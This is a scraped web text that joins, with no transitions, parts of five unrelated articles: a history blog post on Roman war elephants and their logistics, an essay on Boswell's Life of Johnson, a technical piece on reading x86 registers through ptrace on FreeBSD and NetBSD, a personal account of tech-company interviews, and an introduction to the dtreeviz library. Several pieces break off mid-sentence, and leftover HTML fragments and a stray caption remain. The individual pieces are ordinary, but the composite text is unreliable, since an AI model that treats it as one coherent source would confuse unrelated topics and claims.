I missed this last time, but I just want to note <strong>everything</strong> is wrong with this.  Let me count the ways:<br>1) These elephants are <strong>way</strong> too big.<br>2) The towers on their backs won’t be invented for more than a century<br>3) The bit-and-bridle system of control is not how elephants are controlled.<br>4) The weapons for the tusks are also wrong.<br>5) <strong>Xerxes didn’t have any elephants in his army</strong> (not even in the fantasy count that Herodotus gives)<br>6) This is not how you fight elephants and will get everyone stepped on.<br>One of these days, we’re going to talk about this movie and Sparta.  Until then: <strong>Sparta is terrible.</strong></figcaption></figure>



<p>So today we’re going to ask, “why?”  We’ve answered that question in the immediate term – to quote Trautmann (2015) on the point, “the Roman refusal of the war elephant..was based upon a low estimate of its value” (250).  To put another way, they thought they sucked.  We know elephants <em>could</em> be quite potent in battle, so the answer must be a touch more complicated.  We’ll look at this two ways: first (because it’s me) in terms of <em><strong>logistics</strong></em>, and then in terms of anti-elephant <em><strong>tactics</strong></em>, to see why elephants could not succeed against (or with) Rome.  I am also going to speculate – just a touch – on which of these factors might explain the other major area elephant warfare did not penetrate: China.</p>



<h2>Roman Elephants</h2>



<p>But first, a necessary caveat to an objection no doubt already brewing in the minds of some: but didn’t the Romans use elephants sometimes?  Yes, though Roman employment of elephants was at best uneven (this is a point, I’d like to note, where Trautmann (2015) shows its value over, for instance, J. M. Kistler’s <em>War Elephants </em>(2006) – the latter’s reading of Roman use of war elephants bends the evidence to serve an argument, rather than the other way around).  Nevertheless, the Romans did use war elephants during the last two centuries of the Republic.</p>



<p>The Romans had some war elephants (just 20) at Cynocephelae (197 B.C.) against Macedon – these had been drawn from the kingdom of Numidia, which had sided with Rome against Carthage in the Second Punic War.  Plutarch (<em>Flam</em>. 8.2-5) leaves the animals out of the battle narrative, but Livy (who is the better source; Liv. 33.9) notes their use to break up the Macedonian right wing, which was not yet even in fighting formation.  It’s not clear the elephants were necessary for the Roman victory here and the key action was actually a flanking attack by infantry.</p>



<p>The Romans brought elephants to Magnesia (190 B.C.), but left them in reserve; the Romans only had a few, whereas their Seleucid opponents had brought many more.  Moreover, the Roman elephants were smaller African elephants, effectively useless against the large Asian elephants the Seleucids used.  Pydna (168 B.C.) against the Macedonians again, is harder to assess because the sources for it are poor (part of Livy’s narrative of the battle is lost).  Plutarch (<em>Aem.</em> 19-22) leaves the elephants out again, whereas Livy stops to expressly say they were useless.  Kistler (himself reliant on other scholars to read the Latin for him) reads this as the elephants being the decisive element; the sources cannot support this reading.  Livy – who appears to be quoting Polybius, a contemporary of the battle – is quite clear what he thinks of the elephants, “For as new inventions often have great force in the words of men, but when tried, when they need to work, and not just have their working described, they evaporate without any effect – just so the war elephants were just a name without any real use.” (<a href="http://www.perseus.tufts.edu/hopper/text?doc=Perseus%3Atext%3A1999.02.0211%3Abook%3D44%3Achapter%3D41">Liv 44.41.4</a>, my rough translation).</p>

<p>The Romans did find elephants useful in places like Spain or southern Gaul (modern Provence) where just a handful could bewilder and terrify opponents completely unused to and unprepared for them.  The last gasp of true Roman war elephants came in 46 B.C., where Julius Caesar defeated a Roman army led by Metellus Scipio which had sixty elephants in it.  The elephants lost and one of Caesar’s legions (my personal favorite, Legio V Alaudae (Larks!)) took the elephant as a legionary symbol in commemoration of having beaten them.</p>



<p>So absolutely yes, the Romans of the Middle and Late Republic made some use of war elephants, but it was hardly a distinguished run.  As Trautmann notes – quite correctly, in my view – the Romans were always more interested in ways to defeat elephants than to use them.  Which brings us back to our question: elephants are <strong>awesome</strong>, Romans are <em>also awesome</em>…so why didn’t the Romans like elephants?</p>



<h2>Elephant Logistics</h2>



<p>From trunk to tail, elephants are a logistics <em>nightmare</em>.</p>



<p>And that begins almost literally at birth.  For areas where elephants are native, nature (combined, typically, with the local human terrain) create a local ‘supply.’  In India this meant the elephant forests of North/North-Eastern India; the range of the North African elephant (<em>Loxodonta africana pharaohensis</em>, the most likely source of Ptolemaic and Carthaginian war elephants) is not known.  Thus for many elephant-wielding powers, trade was going to always be a key source for the animals – either trade with far away kingdoms (the Seleucids traded with the Mauyran Indian kingdom for their superior Asian elephants) or with thinly ruled peripheral peoples who lived in the forests the elephants were native to.</p>



<p>(We’re about to get into some of the specifics of elephant biology.  If you are curious on this topic, I am relying heavily on R. Sukumar, <em>The Asian Elephant: Ecology and Management</em> (1989).  I’ve found that information on Asian elephants (<em>Elephas maximus</em>) <strong>much</strong> easier to come by than information on African elephants (<em>Loxodonta africana</em> and <em>Loxodonta cyclotis</em>).)</p>



<p>In that light, creating a breeding program – as was done with horses – seems like a great idea.  Except there is one major problem: a horse requires about four years to reach maturity, a mare gestates a foal in eleven months and can go into heat almost immediately thereafter.  By contrast, elephants reach adulthood after seventeen years, take 18-22 months to gestate and female elephants do not typically mate until their calf is weaned, four to five years after its birth.  A ruler looking to build a stable of cavalry horses thus may start small and grow rapidly; a ruler looking to build a corps of war elephants is looking at a very slow process.  This is compounded by the fact that elephants are notoriously difficult to breed in captivity.  There is some speculation that the Seleucids nonetheless attempted this at Apamea, where they based their elephants – in any event, they seem to have remained dependent on imported Indian elephants to maintain the elephant corps.  If a self-sustaining elephant breeding program for war elephants was ever created, we do not know about it.</p>



<p>To make matters <em>worse</em>, elephants require <strong>massive</strong> amounts of food and water.  In video-games, this is often represented through a high elephant ‘upkeep’ cost – but this often falls well short of the reality of keeping these animals for war.  Let’s take <em>Total War: Rome II</em> as an example: a unit of Roman (auxiliary) African elephants (12 animals), costs 180 upkeep, compared to 90 to 110 upkeep for 80 horses of auxiliary cavalry (there are quite a few types) – so one elephant (with a <em>mahout</em>) costs 15 upkeep against around 1.25 for a horse and rider (a 12:1 ratio).  Paradox’s <em>Imperator</em> does something similar, with a single unit of war elephants requiring 1.08 upkeep, compared to just 0.32 for light cavalry; along with this, elephants have a heavy ‘supply weight’ – twice that of an equivalent number of cavalry (so something like a 2:1 or 3:1 ratio of cost).</p>

<p>Believe it or not, this <em>understates</em> just how hungry – and expensive – elephants are.  The standard barley ration for a Roman horse was 7kg of barley per day (7 Attic medimnoi per month; Plb. 6.39.12); this would be supplemented by grazing.  Estimates for the food requirements of elephants vary widely (in part, it is hard to measure the dietary needs of grazing animals), but elephants require in excess of 1.5% of their body-weight in food <em>per day</em>.  …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Boswell's <em>Life of Johnson</em> is not just one of my favorite books, it also engendered some of my favorite book reviews. While praise for the work is universal, the main question commentators try to answer is this: how did the worst man in the world manage to write the best biography?</p><p>Who was James Boswell? He was a perpetual drunk, a degenerate gambler, a sex addict, whoremonger, exhibitionist, and rapist. He gave his wife an STD he caught from a prostitute.</p><p>Selfish, servile and self-indulgent, lazy and lecherous, vain, proud, obsessed with his aristocratic status, yet with no sense of propriety whatsoever, he frequently fantasized about the feudal affection of serfs for their lords. He loved to watch executions and was a proud supporter of slavery.</p><p>“Where ordinary bad taste leaves off,” John Wain comments, “Boswell began.” The Thrales were long-time friends and patrons of Johnson; a <em>single day</em> after Henry Thrale died, Boswell wrote a poem fantasizing about the elderly Johnson and the just-widowed Hester: "Convuls'd in love's tumultuous throws, / We feel the aphrodisian spasm". The rest of his verse is of a similar quality; naturally he considered himself a great poet.</p><p>Boswell combined his terrible behavior with a complete lack of shame, faithfully reporting every transgression, every moronic ejaculation, every faux pas. The first time he visited London he went to see a play and, as he happily tells us himself, he "entertained the audience prodigiously by imitating the lowing of a cow."</p><p>By all accounts, including his own, he was an idiot. On a tour of Europe, his tutor said to him: "of young men who have studied I have never found one who had so few ideas as you."</p><p>As a lawyer he was a perpetual failure, especially when he couldn't get Johnson to write his arguments for him. As a politician he didn't even get the chance to be a failure despite decades of trying.</p><p>His correspondence with Johnson mostly consists of Boswell whining pathetically and Johnson telling him to get his shit together.</p><p>He commissioned a portrait from his friend Joshua Reynolds and stiffed him on the payment. His descendants hid the portrait in the attic because they were ashamed of being related to him.</p><p>Desperate for fame, he kept trying to attach himself to important people, mostly through sycophancy. In Geneva he pestered Rousseau,<span><a href="#fn2189487741" rel="footnote"><sup id="fnref2189487741">1</sup></a></span> leading to this conversation:</p><blockquote><p>Rousseau: You are irksome to me. It’s my nature. I cannot help it.<br>Boswell: Do not stand on ceremony with me.<br>Rousseau: Go away.</p></blockquote><p>Later, Boswell was given the task of escorting Rousseau's mistress Thérèse Le Vasseur to England—they had an affair on the way.</p><p>When Adam Smith and Edward Gibbon were elected to The Literary Club, Boswell considered leaving because he thought the club had now "lost its select merit"!</p><p>On the positive side, his humor and whimsy made for good conversation; he put people at ease; he gave his children all the love his own father had denied him; and, somehow, he wrote one of the great works of English literature.</p><p><em>The Life of Samuel Johnson, LL.D.</em> was an instant sensation. While the works of Johnson were quickly forgotten,<span><a href="#fn2189487742" rel="footnote"><sup id="fnref2189487742">2</sup></a></span> his biography has never been out of print in the 229 years since its initial publication. It went through 41 editions just in the 19th century.</p><p>Burke told King George III that he had never read anything more entertaining. Coleridge said "it is impossible not to be amused with such a book." George Bernard Shaw compared Boswell's dramatization of Johnson to Plato's dramatization of Socrates, and placed old Bozzy in the middle of an "apostolic succession of dramatists" from the Greek tragedians through Shakespeare and ending, of course, with Shaw himself.</p><p>It is a strange work, an experimental collage of different modes: part traditional biography, part collection of letters, and part direct reports of Johnson's life as observed by Boswell.<span><a href="#fn2189487743" rel="footnote"><sup id="fnref2189487743">3</sup></a></span> His inspiration came not from literature, but from the minute naturalistic detail of Flemish paintings. It is difficult to convey its greatness in compressed form: Boswell is not a great writer at the sentence level, and all the famous quotes are Johnsonian <em>bon mots</em>. The book succeeds through a cumulative effect.</p><p>Johnson was 54 years old when he first met Boswell, and most of his major accomplishments (the poetry, the dictionary, <em>The Rambler</em>) were behind him; his wife had already died; he was already the recipient of a £300 pension from the King; his edition of Shakespeare was almost complete. All in all they spent no more than 400 days together. Boswell had limited material to work with, but what he doesn't capture in fact, he captures in feeling: an entire life is contained in this book: love and friendship, taverns and work, the glory of success and recognition, the depressive bouts of failure and penury, the inevitable tortures of aging and death.</p><p>Out of a person, Boswell created a literary personality. His powers of characterization are positively Shakespearean, and his Johnson resembles none other but the bard's greatest creation: Sir John Falstaff. Big, brash, and deeply flawed, but also lovable. He would "laugh like a rhinoceros":</p><blockquote><p>Johnson could not stop his merriment, but continued it all the way till he got without the Temple-gate. He then burst into such a fit of laughter that he appeared to be almost in a convulsion; and in order to support himself, laid hold of one of the posts at the side of the foot pavement, and sent forth peals so loud, that in the silence of the night his voice seemed to resound from Temple-bar to Fleet ditch.</p></blockquote><p>And around Johnson he painted an entire dramatic cast, bringing 18th century London to life: Garrick the great actor, Reynolds the painter, Beauclerk with his banter, Goldsmith with his insecurities. Monboddo and Burke, Henry and Hester Thrale, the blind Mrs Williams and the Jamaican freedman Francis Barber.</p><p>Borges (who was also a big fan) finds his parallels not in Shakespeare and Falstaff, but in Cervantes and Don Quixote. He (rather implausibly) suggests that every Quixote needs his Sancho, and "Boswell appears as a despicable character" deliberately to create a contrast.<span><a href="#fn2189487744" rel="footnote"><sup id="fnref2189487744">4</sup></a></span></p><p>And in the 1830s, two brilliant and influential reviews were written by two polar opposites: arch-progressive Thomas Babington Macaulay and radical reactionary Thomas Carlyle. The first thing you'll notice is their sheer magnitude: <a href="https://oll-resources.s3.amazonaws.com/titles/362/1227.01_Bk.pdf" target="_blank" rel="noopener">Macaulay's</a> is 55 pages long, while <a href="https://sci-hub.se/https://doi.org/10.1017/CBO9780511697234.003" target="_blank" rel="noopener">Carlyle's review in Fraser's Magazine</a> reaches 74 pages!<span><a href="#fn2189487745" rel="footnote"><sup id="fnref2189487745">5</sup></a></span> And while they both agree that it's a great book and that Boswell was a scoundrel, they have very different theories about what happened.</p><h2 id="Macaulay"><a href="#Macaulay" title="Macaulay"></a>Macaulay</h2><p>Never in history, Macaulay says, has there been "so strange a phænomenon as this book". On the one hand he has effusive praise:</p><blockquote><p>Homer is not more decidedly the first of heroic poets, Shakspeare is not more decidedly the first of dramatists, Demosthenes is not more decidedly the first of orators, than Boswell is the first of biographers. He has no second. He has distanced all his competitors so decidedly that it is not worth while to place them.</p></blockquote><p>On the other hand, he spends several paragraphs laying into Boswell with gusto:</p><blockquote><p>He was, if we are to give any credit to his own account or to the united testimony of all who knew him, a man of the meanest and feeblest intellect. [...] He was the laughing-stock of the whole of that brilliant society which has owed to him the greater part of its fame. He was always laying himself at the feet of some eminent man, and begging to be spit upon and trampled upon. [...] Servile and impertinent, shallow and pedantic, a bigot and a sot, bloated with family pride, and eternally blustering about the dignity of a born gentleman, yet stooping to be a talebearer, an eavesdropper, a common butt in the taverns of London.</p></blockquote><p>Macaulay's theory is that while Homer and Shakespeare and all the other greats owe their eminence to their virtues, Boswell is unique in that he owes <em>his</em> success to his vices.</p><blockquote><p>He was a slave, proud of his servitude, a Paul Pry, convinced that his own curiosity and garrulity were virtues, an unsafe companion who never scrupled to repay the most liberal hospitality by the basest violation of confidence, a man without delicacy, without shame, without sense enough to know when he was hurting the feelings of others or when he was exposing himself to derision; and because he was all this, he has, in an important department of literature, immeasurably surpassed such writers as Tacitus, Clarendon, Alfieri, and his own idol Johnson.</p></blockquote><blockquote><p>Of the talents which ordinarily raise men to eminence as writers, Boswell had absolutely none. There is not in all his books a single remark of his own on literature, politics, religion, or society, which is not either commonplace or absurd. [...] Logic, eloquence, wit, taste, all those things which are generally considered as making a book valuable, were utterly wanting to him. He had, indeed, a quick observation and a retentive memory. These qualities, if he had been a man of sense and virtue, would scarcely of themselves have sufficed to make him conspicuous; but, because he was a dunce, a parasite, and a coxcomb, they have made him immortal.</p></blockquote><p>The work succeeds partly because of its subject: if Johnson had not been so extraordinary, then airing all his dirty laundry would have just made him look bad.</p><blockquote><p>No man, surely, ever published such stories respecting persons whom he professed to love and revere. He would infallibly have made his hero as contemptible as he has made himself, had not his hero really possessed some moral and intellectual qualities of a very high order. The best proof that Johnson was really an extraordinary man is that his character, instead of being degraded, has, on the whole, been decidedly raised by a work in which all his vices and weaknesses are exposed.</p></blockquote><p>And finally, Boswell provided Johnson with a curious form of literary fame:</p><blockquote><p>The reputation of [Johnson's] writings, which he probably expected to be immortal, is every day fading; while those peculiarities of manner and that careless …</p></blockquote></div></div>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/cpu-context-switch.svg" alt="Context Switch"></p>

<p>In this article, I would like to shortly describe the methods used
to dump and restore the different kinds of registers on 32-bit
and 64-bit x86 CPUs.  The first part will focus on General Purpose
Registers, Debug Registers and Floating-Point Registers up to the XMM
registers provided by the SSE extension.  I will explain how their
values can be obtained via the <code>ptrace(2)</code> interface.</p>

<p>The <code>ptrace(2)</code> API is commonly used in all modern BSD systems
and Linux, as all of them derive it from the original form designed
and implemented in 4.3BSD.  The primary focus in this article is
on the FreeBSD and NetBSD systems.  Nevertheless, the users of other
Operating Systems such as OpenBSD, DragonFly BSD or Linux can still
benefit from this article as the basic principles are the same
and the code examples are intended to be easily adapted to other
platforms.</p>

<p>A single CPU (in modern hardware: CPU core or CPU thread,
if hyperthreading is available) can execute only one program thread
at a time.  In order to be able to run multiple processes and threads
quasi-simultaneously, the Operating System must perform <em>context
switching</em> — that is periodically suspend the currently running thread,
save its state, restore the saved state of another thread and resume it.
Saving and restoring the values of the processor’s registers play
an important part in context switching.  It is important that
this process is fully transparent to the process being switched,
and in a properly implemented kernel there should be no side effects
that are perceptible to the program.</p>

<p>The debugger may need to examine the register sets of the debugged
program for a number of reasons.  By inspecting the Program Counter,
it is able to determine the location in source code at which
the execution will continue, and by altering it it can control
the execution.  The Stack Pointer is necessary to introspect variables
stored on the stack, while the remaining registers can hold variables
themselves.</p>

<p>A special set of the x86 registers are the Debug Registers.  They are
not accessible to the program itself; however, they can be read
or written by the debugger.  They allow setting hardware assisted
breakpoints (instruction execute trap) on the code being executed,
and watchpoints (read and/or write operation trap) on the variables.</p>

<h2 id="general-purpose-registers-gpr">General Purpose Registers (GPR)</h2>

<h3 id="copying-gprs">Copying GPRs</h3>

<p>The term ‘General Purpose Registers’ is a bit ambiguous.
In the narrower sense, it means the few (8 on i386, 16 on amd64)
baseline registers that can be used to store arbitrary data (usually
integers or pointers).  In the wider sense it means all baseline
registers in the processor architecture, historically excluding
floating-point registers and special kinds of registers.  On x86, this
includes the ‘narrower sense’ general-purpose registers, the Program
Counter (EIP/RIP), segment registers and the flag register.</p>

<p>The majority of the General Purpose Registers can be copied directly,
e.g. using the <code>MOV</code> instruction, or pushed onto the stack
via <code>PUSH</code>.  The EIP/RIP register can be copied using the <code>LEA</code>
instruction, and restored via <code>JMP</code>.  The flag register can be pushed
onto the stack via <code>PUSHFD</code>/<code>PUSHFQ</code>, and afterwards popped from it
via <code>POPFD</code>/<code>POPFQ</code>.</p>

<p>The listing below demonstrates a program that grabs the values of all
amd64 GPRs at an arbitrary point during the execution and prints them
after returning from assembly.</p>

<h3 id="the-gpr-ptrace-2-api">The GPR ptrace(2) API</h3>

<p>Both FreeBSD and NetBSD use the <code>PT_GETREGS</code> request to get the values
of GPRs from the program, and <code>PT_SETREGS</code> to update them.
The requests take a pointer to <code>struct reg</code> as an argument.</p>

<p>On FreeBSD, both i386 and amd64 have the individual registers listed
as fields of the struct.  On NetBSD, i386 uses a regular structure,
while amd64 puts all values into an array whose indices are defined
in the headers as constants.</p>

<p>The listing below compares the structures used on FreeBSD and NetBSD.
Note that NetBSD/amd64 uses a special macro.  For example,
<code>greg(rdi RDI, 0)</code> defines <code>_REG_RDI</code>.</p>

              <article>

<p>Welcome back! Let’s continue the previous post on my <a href="https://jmmv.dev/2020/10/bye-google-hi-microsoft.html">reasons for moving from Google to Microsoft</a> by looking at my whole interviewing process. I’ve been asked by a few peers to narrate this story because they are curious to know how this process looked like for a person with 10+ years of professional experience. And, well, it’s just a topic I wanted to write about anyway 😉.</p>

<p>As a reminder, and to pique your interest, I applied for:</p>

<ul>
<li>🟦 a Software Engineer (SWE) position at Facebook;</li>
<li>🟦 a Production Engineer (PE) position at Facebook;</li>
<li>⚫ a Software Engineer (SWE) position at Twitter in their Build Efficiency team;</li>
<li>💚 a Principal Software Engineer (SDE) position at Microsoft in their Azure Data product; and</li>
<li>💚 a Principal Software Engineer (SDE) position at Microsoft in their Azure Storage product.</li>
</ul>

<p>That’s a total of 5 applications and talks with ~40 different people. Of those, the position in Azure Data vanished before I even interviewed, but I successfully <em>got to the offer stage for the other 4</em>. I entered this whole endeavor fixated on joining Facebook but… along the way, I uncovered exciting opportunities throughout, making my choice exceedingly difficult. In the end, I swerved towards the Azure Storage position for various reasons, but it’d have gone either way.</p>

<p>In this post, I want to be as honest and open as possible about <em>my personal situation</em> and how it related to the processes. As a result, some of the things I say might sound like a borderline rant—but that’s not the intention. Lastly, remember that interviewing always comes with the need to sign an NDA, so I cannot go into a lot of details.</p>



<p>Before we get into the processes, let’s talk about… career ladder <em>levels</em>! Uh, so exciting.</p>

<p>Levels are a very important topic for this discussion because each of the positions I applied to was attached to a specific level. The positions’ level significantly influenced how I went about zeroing in on my final choice. Beware that my view on this topic is through Google-tinted glasses and doesn’t necessarily apply to all companies—although I believe it does for the companies I talked to.</p>

<p>You see, recruiters and higher-level peers will often tell you not to get obsessed with levels or promotion: <em>“levels don’t matter”</em>, they’ll happily say. In principle, the people you work with know how you work in practice so the level you are at is irrelevant, and higher compensation can be achieved without promotion. Yes, compensation is weird: you can be paid more at a lower level by constantly exceeding expectations than at a higher level by just cruising.</p>

<p>In reality, however, I believe levels <em>do</em> matter a lot, even for an Individual Contributor (IC, non-manager) position. Here is why:</p>

<ul>
<li><p>Being at a higher level influences the kind of opportunities you are <em>exposed</em> to work on. You’d like to think that expertise and recognition do that instead: and they definitely do, but only within the realm of your team. Once you have to deal with teams and managers that don’t know you personally, the level you hold conveys that information. And thus the same applies when you land at a new company where nobody knows anything about you.</p></li>

<li><p>Being at a higher level grants you extra responsibilities and expectations—and I say <em>grant</em> because I think those are great traits. I personally want to grow in these areas, and I know that getting a higher title will subconsciously influence me to behave differently, just as it happened once I go the not-officially-recognized Tech Lead job within my team.</p></li>
</ul>

<p>NOTE: This is a good chance to visit <a href="https://www.levels.fyi/">levels.fyi</a>. Familiarize yourself with how levels map across companies and how they overlap across them. What’s <strong>not</strong> depicted there are the actual responsibilities of each level, nor that level compensation bans overlap <em>within a company</em>.</p>

<p>You might be wondering why any of this is important during the interviewing process. In fact, if all you care about is higher compensation, then this isn’t very important.</p>

<p>For me, though, my personal situation was problematic in finding the right position. I had been at the Senior (L5) level at Google for 5 years now, trying to make the jump into Staff (L6) territory for at least 3 of those years. My management chain and direct peers had been supportive of this promotion for quite a while now, and I am convinced my work did too. As a result, my compensation matched that: I was at the top of the Senior level band.</p>

<p>This unofficial recognition, however, is not reflected anywhere: you have to believe me at face value. For anyone that doesn’t know me within or outside the company, I’m an L5—and that can mean <em>a lot</em> of different things because of how broad levels are. One might be at the lower level, struggling to keep up with the demands and being paid the bare minimum; one can be in the middle, having a comfortable and non-stressful life with a good salary; and one can be at the top, trying to make the leap into the next band.</p>

<p>Unfortunately for me, the jump into the Staff level didn’t materialize at Google, dare I say… due to process failures. Promotions are a game and it is a game I did not play well; keep that in mind if you want them. But I didn’t want the job change to <em>feel</em> like a step down. <strong>My goal was to get hired as a Google L6-equivalent position elsewhere</strong> to properly reflect my skills, to make me uncomfortable enough to grow new skills, and to not have to prove myself all over again, which would take a long time.</p>



<p>Dealing with different companies at the same time was an exhausting, but important, process. As a reminder: if you want to have any leverage during offer negotiations, you ought to have other offers on the table. In the end, and as we shall see later, these weren’t very useful for my own negotiations (other things were), but they were eye-opening as I got to witness that there are exciting opportunities everywhere.</p>

<p>Given the many people I talked to (about 40) and the length of the process, I took copious notes each time I interacted with anyone. Specifically, I captured the names of each person I talked to and what they did at each company. I also captured anything the recruiters said in order to prevent future misunderstandings, because sometimes they contradicted what others had previously said.</p>

<p>Below is the full timeline. I know it’s long but I want to show how all the processes interwove. To that end, I have color- and shape-coded entries: Facebook is 🟦, Twitter is ⚫, and Microsoft is 💚:</p>

<p>Decision trees are the fundamental building block of <a href="http://explained.ai/gradient-boosting/index.html">gradient boosting machines</a> and <a href="https://en.wikipedia.org/wiki/Random_forest">Random Forests</a>™, probably the two most popular machine learning models for structured data.  Visualizing decision trees is a tremendous aid when learning how these models work and when interpreting models.  Unfortunately, current visualization packages are rudimentary and not immediately helpful to the novice. For example, we couldn't find a library that visualizes how decision nodes split up the feature space. It is also uncommon for libraries to support visualizing a specific feature vector as it weaves down through a tree's decision nodes; we could only find one image showing this.</p>

<p>So, we've created a general package for <a href="https://github.com/scikit-learn/scikit-learn">scikit-learn</a> decision tree visualization and model interpretation, which we'll be using heavily in an upcoming <a href="https://mlbook.explained.ai/">machine learning book</a> (written with <a href="http://www.fast.ai/about/#jeremy">Jeremy Howard</a>).  Here's a sample visualization for a tiny decision tree (click to enlarge):</p>

<p><a href="https://explained.ai/decision-tree-viz/images/samples/wine-TD-2.svg"><img src="https://explained.ai/decision-tree-viz/images/samples/wine-TD-2.svg" width="70%"></a></p>

<p>This article demonstrates the results of this work, details the specific choices we made for visualization, and outlines the tools and techniques used in the implementation. The visualization software is part of a nascent Python machine learning library called <a href="https://github.com/parrt/dtreeviz">dtreeviz</a>.  We assume you're familiar with the basic mechanism of decision trees if you're interested in visualizing them, but let's start with a brief summary so that we're all using the same terminology. (If you're not familiar with decision trees, check out <a href="http://course.fast.ai/ml">fast.ai's Introduction to Machine Learning for Coders MOOC</a>.)</p>



<h2 id="sec:1.1">1.1 Decision tree review</h2>


<p>A decision tree is a machine learning model based upon binary trees (trees with at most a left and right child).  A decision tree learns the relationship between observations in a training set, represented as feature vectors <span>x</span> and target values <span>y</span>, by examining and condensing training data into a binary tree of interior nodes and leaf nodes.  (Notation: vectors are in bold and scalars are in italics.)</p>

<p>Each leaf in the decision tree is responsible for making a specific prediction. For regression trees, the prediction is a value, such as price.  For classifier trees, the prediction is a target category (represented as an integer in scikit), such as cancer or not-cancer. A decision tree carves up the feature space into groups of observations that share similar target values and each leaf represents one of these groups.  For regression, similarity in a leaf means a low variance among target values and, for classification, it means that most or all targets are of a single class.</p>

<p>Any path from the root of the decision tree to a specific leaf predictor passes through a series of (internal) decision nodes. Each decision node compares a single feature's value in <span>x</span>, <span>x<sub>i</sub></span>, with a specific <i>split point</i> value learned during training. For example, in a model predicting apartment rent prices, decision nodes would test features such as the number of bedrooms and number of bathrooms. (See <b>Section 1.5.3</b> <i>Visualizing tree interpretation of a single observation</i>.) Even in a classifier with discrete target values, decision nodes still compare numeric <i>feature</i> values because scitkit's decision tree implementation assumes that all features are numeric. Categorical variables must be <a href="https://machinelearningmastery.com/how-to-one-hot-encode-sequence-data-in-python/">one hot encoded</a>, <a href="https://www.analyticsvidhya.com/blog/2015/11/easy-methods-deal-categorical-variables-predictive-modeling/">binned</a>, <a href="http://forums.fast.ai/t/to-label-encode-or-one-hot-encode/6057">label encoded</a>, etc... </p>

<p>To train a decision node, the model examines a subset of the training observations (or the full training set at the root). The node's feature and split point within that feature space are chosen during training to split the observations into left and right buckets (subsets) to maximize similarity as defined above. (This selection process is generally done through exhaustive comparison of features and  feature values.) The left bucket has observations whose <span>x<sub>i</sub></span> feature values are all less than the split point and the right bucket has observations whose <span>x<sub>i</sub></span> is greater than the split point.   Tree construction proceeds recursively by creating decision nodes for the left bucket and the right bucket.  Construction stops when some stopping criterion is reached, such as having less than five observations in the node.</p>



<h2 id="sec:1.2">1.2 The key elements of decision tree visualization</h2>


<p>Decision tree visualizations should highlight the following important elements, which we demonstrate below.</p>
<ul>
<li>Decision node <b>feature versus target value</b> distributions (which we call feature-target space in this article). We want to know how separable the target values are based upon the feature and a split point.</li>
<li>Decision node <b>feature name and feature split value</b>.  We need to know which feature each decision node is testing and where in that space the nodes splits the observations.</li>
<li><b>Leaf node purity</b>, which affects our prediction confidence. Leaves with low variance among the target values (regression) or an overwhelming majority target class (classification) are much more reliable predictors.</li>
<li><b>Leaf node prediction value</b>.  What is this leaf actually predicting from the collection of target values?</li>
<li><b>Numbers of samples in decision nodes</b>.  Sometimes it's useful to know where all most of the samples are being routed through the decision nodes.</li>
<li><b>Numbers of samples in leaf nodes</b>.  Our goal is a decision tree with fewer, larger and purer leaves. Nodes with too few samples are possible indications of overfitting.</li>
<li>How a specific feature vector is <b>run down the tree</b> to a leaf. This helps explain why a particular feature vector gets the prediction it does. For example, in a regression tree predicting apartment rent prices, we might find a feature vector routed into a high predicted price leaf because of a decision node that checks for more than three bedrooms.</li>
</ul>

<p>Before digging into the previous state-of-the-art visualizations, we'd like to give a little spoiler to show what's possible. This section highlights some samples visualizations we built from scikit regression and classification decision trees on a few data sets. You can also check out the	<a href="https://github.com/parrt/dtreeviz/tree/master/testing/samples">full gallery</a> and <a href="https://github.com/parrt/dtreeviz/blob/master/testing/gen_samples.py">code to generate all samples</a>.</p>

<h2 id="sec:1.4">1.4 A comparison to previous state-of-the-art visualizations</h2>


<p>If you search for “visualizing decision trees” you will quickly find a <b>Python</b> solution provided by the awesome scikit folks: <a href="http://scikit-learn.org/stable/modules/generated/sklearn.tree.export_graphviz.html">sklearn.tree.export_graphviz</a>.  With more work, you can find visualizations for <a href="http://scikit-learn.org/stable/modules/tree.html">R</a> and even <a href="http://support.sas.com/documentation/cdl/en/vaug/68027/HTML/default/viewer.htm#n0q3i0zwng79kin1kb1zvpo9k312.htm">SAS</a> and <a href="https://www.ibm.com/support/knowledgecenter/en/SS4QC9/com.ibm.solutions.wa_an_overview.2.0.0.doc/wa_discover_viz_expl_insigths_dec_tree.html">IBM</a>. In this section, we collect the various decision tree visualizations we could find and compare them to the visualizations made by our <span>dtreeviz</span> library. We give a more detailed discussion of our visualizations in the next section.</p>

<p>Let's start with the <a href="http://scikit-learn.org/stable/modules/tree.html">default scitkit visualization</a> of a decision tree on the well-known <a href="http://scikit-learn.org/stable/modules/generated/sklearn.datasets.load_iris.html#sklearn.datasets.load_iris">Iris</a> data set (click on images to enlarge).</p>

<p>The scikit tree does a good job of representing the tree structure, but we have a few quibbles.  The colors aren't the best and it's not immediately obvious why some of the nodes are colored and some aren't.  If the colors represent predicted class for this classifier, one would think just the leaves would be colored because only leaves have predictions. (It turns out the non-colored nodes have no majority prediction.) Including the gini coefficient (certainty score) costs space and doesn't help with interpretation. The count of samples of the  various target classes in each node is somewhat useful, but a histogram would be even better. A target class color legend would be nice.  Finally, using true and false as the edge labels isn't as clear as, say, labels <img src="https://explained.ai/decision-tree-viz/images/eqn-524A50782178998021A88B8CD4C8DCD8-depth000.51.svg"> and <img src="https://explained.ai/decision-tree-viz/images/eqn-4EDC933D28BFE3F5EFFE94BF892DAD38-depth001.72.svg">. The most obvious difference is that our decision nodes show feature distributions as overlapping stacked-histograms, one histogram per target class. Also, our leaf size is proportional to the number of samples in that leaf.</p>

<p>Scikit uses the same visualization approach for decision tree regressors. For example, here is scikit's visualization using the <a href="http://scikit-learn.org/stable/modules/generated/sklearn.datasets.load_boston.html">Boston</a> data set, with <span>dtreeviz</span>'s version for comparison (click to enlarge images):</p>

<p>In the scikit tree, it's not immediately clear what the use of color implies, but after studying the image, darker images indicate higher predicted target values. As before, our decision nodes show the feature space distribution, this time using a feature versus target value scatterplot.  The leaves use strip plots to show the target value distribution; leaves with more dots naturally have a higher number of samples.</p>

<p><b>R</b> programmers also have access to a package for <a href="http://blog.revolutionanalytics.com/2013/06/plotting-classification-and-regression-trees-with-plotrpart.html">visualizing decision trees</a>, which gives similar results to scikit but with nicer edge labels:</p>

